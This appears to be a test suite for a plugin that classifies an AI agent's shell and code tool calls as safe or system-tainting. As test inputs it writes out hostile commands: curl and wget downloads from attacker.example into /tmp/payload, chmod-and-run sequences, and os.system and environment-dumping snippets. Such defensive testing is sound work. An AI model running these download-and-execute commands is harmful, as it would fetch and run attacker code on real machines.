from __future__ import annotations

from support import *  # noqa: F403


def _analysis(command: str, tool_name: str = "terminal"):
    plugin = load_plugin()
    return plugin.terminal_analysis.analyze_tool_call(tool_name, {"command": command, "code": command})


def test_original_cron_terminal_helper_is_safe_local_metadata():
    command = (
        "TZ=America/Los_Angeles date '+%A, %B %-d, %Y; %H:%M %Z' && python3 - <<'PY'\n"
        "for f in [57,76,82,56]:\n"
        " print(f, round((f-32)*5/9,1))\n"
        "PY"
    )

    result = _analysis(command)

    assert result.safe_local_metadata is True
    assert result.safe_remote_read is False
    assert result.taints_local_system is False
    assert result.sanitized_reason == "safe local metadata computation"


def test_python_metadata_heredoc_denies_effectful_or_nonliteral_code():
    cases = [
        "import os\nprint(os.environ)",
        "open('/tmp/x').read()",
        "__import__('os').system('id')",
        "eval('1+1')",
        "print('/tmp/x')",
    ]
    for body in cases:
        command = f"python3 - <<'PY'\n{body}\nPY"
        result = _analysis(command)
        assert result.safe_local_metadata is False, body
        assert result.taints_local_system is True, body


def test_public_fetch_to_stdout_is_safe_but_persisted_download_is_not():
    safe_shell = _analysis("curl https://example.com")
    safe_wget = _analysis("wget -qO- https://example.com/payload")
    safe_code = _analysis(
        "import urllib.request\n"
        "data = urllib.request.urlopen('https://example.com/data', timeout=10).read()\n"
        "print(data[:80])\n",
        tool_name="execute_code",
    )

    assert safe_shell.safe_remote_read is True
    assert safe_wget.safe_remote_read is True
    assert safe_code.safe_remote_read is True

    for command in [
        "curl https://attacker.example/payload -o /tmp/payload",
        "curl https://attacker.example/payload --output /tmp/payload",
        "curl -O https://attacker.example/payload",
        "curl https://attacker.example/payload > /tmp/payload",
        "wget https://attacker.example/payload",
        "curl https://attacker.example/payload | tee /tmp/payload",
        "python3 - <<'PY'\nimport urllib.request, pathlib\npathlib.Path('/tmp/payload').write_bytes(urllib.request.urlopen('https://attacker.example/payload').read())\nPY",
    ]:
        result = _analysis(command)
        assert result.safe_remote_read is False, command
        assert result.taints_local_system is True, command


def test_local_artifact_execution_is_not_safe_local_metadata():
    for command in [
        "/tmp/payload",
        "chmod +x /tmp/payload",
        "chmod +x /tmp/payload && /tmp/payload",
        "bash /tmp/payload",
        "./payload",
    ]:
        result = _analysis(command)
        assert result.executes_local_artifact is True, command
        assert result.safe_local_metadata is False, command
        assert result.taints_local_system is True, command
